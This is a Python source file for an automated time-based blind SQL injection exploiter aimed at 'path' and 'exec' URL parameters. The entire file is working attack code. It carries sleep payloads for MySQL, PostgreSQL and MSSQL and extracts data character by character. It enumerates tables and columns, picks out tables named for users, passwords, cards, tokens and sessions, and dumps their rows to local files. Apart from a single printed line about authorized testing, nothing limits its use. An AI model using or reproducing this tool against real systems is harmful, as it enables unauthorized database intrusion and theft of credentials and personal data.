#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ADVANCED SQL INJECTION EXPLOITATION FRAMEWORK
Target: Time-Based Blind SQL Injection in 'path' and 'exec' parameters
Author: Security Researcher
Type: Time-Based Blind SQL Injection
Level: HIGH
"""

import requests
import time
import string
import sys
import os
from urllib.parse import quote, urlparse
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

class AdvancedSQLiExploiter:
    def __init__(self, target_url):
        """
        Initialize the SQL Injection Exploiter
        
        Args:
            target_url (str): The vulnerable URL to attack
        """
        self.target_url = target_url.rstrip('?')
        self.session = requests.Session()
        
        # Set headers to mimic a real browser
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        })
        
        # Configuration
        self.delay_threshold = 4.5  # Minimum delay to consider injection successful
        self.timeout = 15  # Request timeout in seconds
        self.max_query_length = 100  # Maximum length for extracted data
        
        # Database-specific payloads
        self.db_payloads = {
            'MySQL': {
                'time_delay': "' AND SLEEP(5)-- ",
                'version': "@@version",
                'database': "database()",
                'user': "user()",
                'tables_query': "SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1",
                'columns_query': "SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema=database() LIMIT {offset},1",
                'data_query': "SELECT CONCAT_WS('|', {columns}) FROM {table} LIMIT {offset},1"
            },
            'PostgreSQL': {
                'time_delay': "' AND pg_sleep(5)--",
                'version': "version()",
                'database': "current_database()",
                'user': "current_user",
                'tables_query': "SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1 OFFSET {offset}",
                'columns_query': "SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT 1 OFFSET {offset}",
                'data_query': "SELECT CONCAT({columns}, '|') FROM {table} LIMIT 1 OFFSET {offset}"
            },
            'MSSQL': {
                'time_delay': "' WAITFOR DELAY '00:00:05'--",
                'version': "@@version",
                'database': "DB_NAME()",
                'user': "SUSER_NAME()",
                'tables_query': "SELECT table_name FROM information_schema.tables",
                'columns_query': "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
                'data_query': "SELECT {columns} FROM {table}"
            }
        }
        
        print(f"\n{Fore.CYAN}[*] Initializing SQL Injection Exploiter...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target: {self.target_url}{Style.RESET_ALL}")
    
    def print_banner(self):
        """Display the exploitation banner"""
        print(Fore.RED + r"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ███████╗ ██████╗ ██╗      ██╗███╗   ██╗██████╗  ██████╗ ██╗  ██╗███████╗  ║
║    ██╔════╝██╔═══██╗██║      ██║████╗  ██║██╔══██╗██╔═══██╗██║ ██╔╝██╔════╝  ║
║    ███████╗██║   ██║██║      ██║██╔██╗ ██║██████╔╝██║   ██║█████╔╝ █████╗    ║
║    ╚════██║██║   ██║██║      ██║██║╚██╗██║██╔═══╝ ██║   ██║██╔═██╗ ██╔══╝    ║
║    ███████║╚██████╔╝███████╗██║██║ ╚████║██║     ╚██████╔╝██║  ██╗███████╗  ║
║    ╚══════╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝  ║
║                                                                              ║
║               TIME-BASED BLIND SQL INJECTION EXPLOITER                       ║
║                     Target Parameters: path, exec                            ║
║                         Security Level: HIGH                                 ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def test_injection(self, param, payload, expected_delay=5):
        """
        Test if a SQL injection payload works
        
        Args:
            param (str): The parameter to test (path or exec)
            payload (str): The SQL injection payload
            expected_delay (int): Expected delay in seconds
            
        Returns:
            tuple: (bool, float) - (is_vulnerable, actual_delay)
        """
        # Construct the URL
        if '?' in self.target_url:
            url = f"{self.target_url}&{param}={quote(payload)}"
        else:
            url = f"{self.target_url}?{param}={quote(payload)}"
        
        try:
            print(f"{Fore.WHITE}[*] Testing: {payload[:50]}...{Style.RESET_ALL}")
            
            start_time = time.time()
            response = self.session.get(
                url, 
                timeout=expected_delay + 10,
                verify=False,
                allow_redirects=False
            )
            elapsed_time = time.time() - start_time
            
            # Check if the delay matches our expectation
            if elapsed_time >= self.delay_threshold:
                return True, elapsed_time
            else:
                return False, elapsed_time
                
        except requests.exceptions.Timeout:
            # Timeout indicates the delay payload worked
            return True, expected_delay
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Request failed: {e}{Style.RESET_ALL}")
            return False, 0
    
    def identify_database(self, param):
        """
        Identify the database type
        
        Args:
            param (str): The vulnerable parameter
            
        Returns:
            tuple: (str, str) - (database_type, vulnerable_payload)
        """
        print(f"\n{Fore.CYAN}[*] Identifying database type...{Style.RESET_ALL}")
        
        for db_type, db_info in self.db_payloads.items():
            payload = db_info['time_delay']
            print(f"{Fore.WHITE}[*] Testing for {db_type}...{Style.RESET_ALL}")
            
            is_vulnerable, delay = self.test_injection(param, payload)
            
            if is_vulnerable:
                print(f"{Fore.GREEN}[+] Database identified: {db_type}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] Delay: {delay:.2f} seconds{Style.RESET_ALL}")
                return db_type, payload
        
        print(f"{Fore.YELLOW}[!] Could not identify database type, defaulting to MySQL{Style.RESET_ALL}")
        return "MySQL", "' AND SLEEP(5)-- "
    
    def extract_char(self, param, query, position, db_type):
        """
        Extract a single character using blind SQL injection
        
        Args:
            param (str): Vulnerable parameter
            query (str): SQL query to execute
            position (int): Character position to extract
            db_type (str): Database type
            
        Returns:
            str: Extracted character or None if not found
        """
        # Character set to test
        charset = string.ascii_letters + string.digits + " _@!$%^&*()-=+[]{}|;:,.<>?/~`"
        
        for char in charset:
            # Build the conditional delay payload
            if db_type == "MySQL":
                payload = f"' AND IF(ASCII(SUBSTRING(({query}),{position},1))={ord(char)},SLEEP(5),0)-- "
            elif db_type == "PostgreSQL":
                payload = f"' AND (SELECT CASE WHEN (ASCII(SUBSTRING(({query}) FROM {position} FOR 1))={ord(char)}) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
            elif db_type == "MSSQL":
                payload = f"' AND IF(ASCII(SUBSTRING(({query}),{position},1))={ord(char)}) WAITFOR DELAY '00:00:05'--"
            else:
                payload = f"' AND IF(ASCII(SUBSTRING(({query}),{position},1))={ord(char)},SLEEP(5),0)-- "
            
            # Test the payload
            is_vulnerable, delay = self.test_injection(param, payload, 5)
            
            if is_vulnerable:
                return char
        
        return None
    
    def extract_data(self, param, query, db_type, max_length=100):
        """
        Extract data character by character
        
        Args:
            param (str): Vulnerable parameter
            query (str): SQL query to execute
            db_type (str): Database type
            max_length (int): Maximum length to extract
            
        Returns:
            str: Extracted data
        """
        result = ""
        
        for position in range(1, max_length + 1):
            print(f"\r{Fore.WHITE}[*] Extracting character {position}...{Style.RESET_ALL}", end="")
            
            char = self.extract_char(param, query, position, db_type)
            
            if char:
                result += char
                print(f"\r{Fore.GREEN}[+] Current data: {result}{Style.RESET_ALL}")
            else:
                break
        
        print()  # New line after completion
        return result if result else None
    
    def extract_database_info(self, param, db_type):
        """
        Extract database information
        
        Args:
            param (str): Vulnerable parameter
            db_type (str): Database type
            
        Returns:
            dict: Database information
        """
        print(f"\n{Fore.CYAN}[*] Extracting database information...{Style.RESET_ALL}")
        
        db_info = {}
        
        # Get database version
        print(f"{Fore.YELLOW}[*] Extracting version...{Style.RESET_ALL}")
        version_query = f"SELECT {self.db_payloads[db_type]['version']}"
        version = self.extract_data(param, version_query, db_type, 100)
        if version:
            db_info['version'] = version
            print(f"{Fore.GREEN}[+] Version: {version[:80]}...{Style.RESET_ALL}")
        
        # Get current database name
        print(f"{Fore.YELLOW}[*] Extracting database name...{Style.RESET_ALL}")
        db_query = f"SELECT {self.db_payloads[db_type]['database']}"
        db_name = self.extract_data(param, db_query, db_type, 50)
        if db_name:
            db_info['database'] = db_name
            print(f"{Fore.GREEN}[+] Database: {db_name}{Style.RESET_ALL}")
        
        # Get current user
        print(f"{Fore.YELLOW}[*] Extracting current user...{Style.RESET_ALL}")
        user_query = f"SELECT {self.db_payloads[db_type]['user']}"
        current_user = self.extract_data(param, user_query, db_type, 50)
        if current_user:
            db_info['user'] = current_user
            print(f"{Fore.GREEN}[+] User: {current_user}{Style.RESET_ALL}")
        
        return db_info
    
    def extract_tables(self, param, db_type, db_name=None, limit=10):
        """
        Extract table names from the database
        
        Args:
            param (str): Vulnerable parameter
            db_type (str): Database type
            db_name (str): Database name (optional)
            limit (int): Maximum number of tables to extract
            
        Returns:
            list: List of table names
        """
        print(f"\n{Fore.CYAN}[*] Extracting table names...{Style.RESET_ALL}")
        
        tables = []
        
        for i in range(limit):
            # Build the table query based on database type
            if db_type == "MySQL":
                if db_name:
                    table_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {i},1"
                else:
                    table_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1"
            elif db_type == "PostgreSQL":
                table_query = f"SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1 OFFSET {i}"
            else:
                table_query = f"SELECT table_name FROM information_schema.tables"
            
            print(f"{Fore.WHITE}[*] Extracting table #{i+1}...{Style.RESET_ALL}")
            table_name = self.extract_data(param, table_query, db_type, 50)
            
            if table_name and table_name not in tables:
                tables.append(table_name)
                print(f"{Fore.GREEN}[+] Table {i+1}: {table_name}{Style.RESET_ALL}")
            else:
                break
        
        print(f"{Fore.GREEN}[+] Total tables found: {len(tables)}{Style.RESET_ALL}")
        return tables
    
    def extract_columns(self, param, db_type, table_name, limit=10):
        """
        Extract column names from a table
        
        Args:
            param (str): Vulnerable parameter
            db_type (str): Database type
            table_name (str): Table name
            limit (int): Maximum number of columns to extract
            
        Returns:
            list: List of column names
        """
        print(f"\n{Fore.CYAN}[*] Extracting columns from table: {table_name}{Style.RESET_ALL}")
        
        columns = []
        
        for i in range(limit):
            # Build the column query based on database type
            if db_type == "MySQL":
                column_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' AND table_schema=database() LIMIT {i},1"
            elif db_type == "PostgreSQL":
                column_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {i}"
            else:
                column_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'"
            
            print(f"{Fore.WHITE}[*] Extracting column #{i+1}...{Style.RESET_ALL}")
            column_name = self.extract_data(param, column_query, db_type, 50)
            
            if column_name and column_name not in columns:
                columns.append(column_name)
                print(f"{Fore.GREEN}[+] Column {i+1}: {column_name}{Style.RESET_ALL}")
            else:
                break
        
        print(f"{Fore.GREEN}[+] Total columns in {table_name}: {len(columns)}{Style.RESET_ALL}")
        return columns
    
    def dump_table_data(self, param, db_type, table_name, columns, row_limit=3):
        """
        Dump data from a table
        
        Args:
            param (str): Vulnerable parameter
            db_type (str): Database type
            table_name (str): Table name
            columns (list): List of column names
            row_limit (int): Maximum number of rows to dump
            
        Returns:
            list: List of dumped rows
        """
        print(f"\n{Fore.CYAN}[*] Dumping data from table: {table_name}{Style.RESET_ALL}")
        
        if not columns:
            print(f"{Fore.RED}[-] No columns to dump{Style.RESET_ALL}")
            return []
        
        data = []
        columns_str = ", ".join(columns)
        
        for row in range(row_limit):
            # Build the data query based on database type
            if db_type == "MySQL":
                data_query = f"SELECT CONCAT_WS('|', {columns_str}) FROM {table_name} LIMIT {row},1"
            elif db_type == "PostgreSQL":
                data_query = f"SELECT CONCAT({columns_str}, '|') FROM {table_name} LIMIT 1 OFFSET {row}"
            else:
                data_query = f"SELECT {columns_str} FROM {table_name}"
            
            print(f"{Fore.WHITE}[*] Extracting row #{row+1}...{Style.RESET_ALL}")
            row_data = self.extract_data(param, data_query, db_type, 200)
            
            if row_data:
                data.append(row_data)
                print(f"{Fore.GREEN}[+] Row {row+1}: {row_data}{Style.RESET_ALL}")
            else:
                break
        
        # Save data to file
        if data:
            filename = f"{table_name}_dump.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Table: {table_name}\n")
                f.write(f"Columns: {', '.join(columns)}\n")
                f.write(f"Rows extracted: {len(data)}\n")
                f.write("=" * 80 + "\n\n")
                
                for i, row in enumerate(data, 1):
                    f.write(f"Row {i}: {row}\n")
            
            print(f"{Fore.GREEN}[+] Data saved to: {filename}{Style.RESET_ALL}")
        
        return data
    
    def find_sensitive_tables(self, tables):
        """
        Find tables that might contain sensitive data
        
        Args:
            tables (list): List of table names
            
        Returns:
            list: List of sensitive table names
        """
        sensitive_keywords = ['user', 'admin', 'account', 'password', 'login', 
                             'customer', 'member', 'employee', 'credit', 'card',
                             'secret', 'key', 'token', 'session', 'auth']
        
        sensitive_tables = []
        
        for table in tables:
            table_lower = table.lower()
            for keyword in sensitive_keywords:
                if keyword in table_lower:
                    sensitive_tables.append(table)
                    break
        
        return sensitive_tables
    
    def automated_exploitation(self, params=None):
        """
        Perform automated exploitation
        
        Args:
            params (list): List of parameters to test (default: ['path', 'exec'])
        """
        self.print_banner()
        
        if params is None:
            params = ['path', 'exec']
        
        print(f"\n{Fore.CYAN}[*] Starting automated exploitation...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target URL: {self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Testing parameters: {', '.join(params)}{Style.RESET_ALL}")
        
        all_results = []
        
        for param in params:
            print(f"\n{Fore.YELLOW}{'='*80}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Testing parameter: {param}{Style.RESET_ALL}")
            
            # Step 1: Confirm vulnerability
            print(f"{Fore.YELLOW}[*] Confirming SQL Injection vulnerability...{Style.RESET_ALL}")
            
            test_payload = "' AND SLEEP(5)-- "
            is_vulnerable, delay = self.test_injection(param, test_payload)
            
            if not is_vulnerable:
                print(f"{Fore.RED}[-] Parameter {param} is not vulnerable{Style.RESET_ALL}")
                continue
            
            print(f"{Fore.GREEN}[✓] SQL Injection confirmed! (Delay: {delay:.2f}s){Style.RESET_ALL}")
            
            # Step 2: Identify database type
            db_type, payload = self.identify_database(param)
            
            # Step 3: Extract database information
            db_info = self.extract_database_info(param, db_type)
            
            # Step 4: Extract tables
            db_name = db_info.get('database', '')
            tables = self.extract_tables(param, db_type, db_name, limit=15)
            
            if not tables:
                print(f"{Fore.YELLOW}[!] No tables found{Style.RESET_ALL}")
                continue
            
            # Step 5: Find sensitive tables
            sensitive_tables = self.find_sensitive_tables(tables)
            
            print(f"{Fore.GREEN}[+] Sensitive tables found: {len(sensitive_tables)}{Style.RESET_ALL}")
            
            # Step 6: Dump data from sensitive tables
            for table in sensitive_tables[:3]:  # Limit to first 3 sensitive tables
                print(f"\n{Fore.MAGENTA}[*] Exploiting table: {table}{Style.RESET_ALL}")
                
                # Extract columns
                columns = self.extract_columns(param, db_type, table, limit=8)
                
                if columns:
                    # Dump table data
                    self.dump_table_data(param, db_type, table, columns, row_limit=2)
            
            # Save results for this parameter
            result = {
                'parameter': param,
                'database_type': db_type,
                'database_info': db_info,
                'tables_found': len(tables),
                'sensitive_tables': sensitive_tables
            }
            all_results.append(result)
            
            print(f"\n{Fore.GREEN}[✓] Exploitation complete for parameter: {param}{Style.RESET_ALL}")
        
        # Final summary
        self.print_summary(all_results)
    
    def print_summary(self, results):
        """
        Print exploitation summary
        
        Args:
            results (list): List of exploitation results
        """
        print(f"\n{Fore.GREEN}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[*] EXPLOITATION SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'='*80}{Style.RESET_ALL}")
        
        if not results:
            print(f"{Fore.RED}[-] No successful exploitations{Style.RESET_ALL}")
            return
        
        for result in results:
            print(f"\n{Fore.CYAN}[+] Parameter: {result['parameter']}{Style.RESET_ALL}")
            print(f"   • Database Type: {result['database_type']}")
            print(f"   • Database: {result['database_info'].get('database', 'Unknown')}")
            print(f"   • User: {result['database_info'].get('user', 'Unknown')}")
            print(f"   • Tables Found: {result['tables_found']}")
            print(f"   • Sensitive Tables: {', '.join(result['sensitive_tables'][:5])}")
        
        # List saved files
        print(f"\n{Fore.CYAN}[*] FILES SAVED:{Style.RESET_ALL}")
        
        saved_files = [f for f in os.listdir() if f.endswith('_dump.txt')]
        
        if saved_files:
            for file in saved_files:
                print(f"   • {file}")
        else:
            print(f"   • No data files saved")
        
        print(f"\n{Fore.YELLOW}[!] IMPORTANT NOTES:{Style.RESET_ALL}")
        print(f"   1. Time-Based Blind SQL Injection is VERY SLOW (character by character)")
        print(f"   2. You can adjust extraction speed by modifying delay_threshold")
        print(f"   3. Consider using UNION-based if the application returns data")
        print(f"   4. Always test on authorized systems only")
        
        print(f"\n{Fore.GREEN}[+] Exploitation complete!{Style.RESET_ALL}")

def main():
    """Main function to run the exploit"""
    
    print(f"{Fore.CYAN}[*] SQL Injection Exploitation Tool{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Target Parameters: path, exec{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Injection Type: Time-Based Blind SQL{Style.RESET_ALL}")
    
    # Get target URL
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = input(f"\n{Fore.YELLOW}[?] Enter target URL: {Style.RESET_ALL}").strip()
    
    if not target_url:
        print(f"{Fore.RED}[!] Error: No URL provided{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Usage: python3 {sys.argv[0]} <URL>{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Example: python3 {sys.argv[0]} http://example.com/vuln.php{Style.RESET_ALL}")
        sys.exit(1)
    
    # Add http:// if not present
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    # Create exploiter and run
    exploiter = AdvancedSQLiExploiter(target_url)
    
    try:
        exploiter.automated_exploitation()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Exploitation interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error during exploitation: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()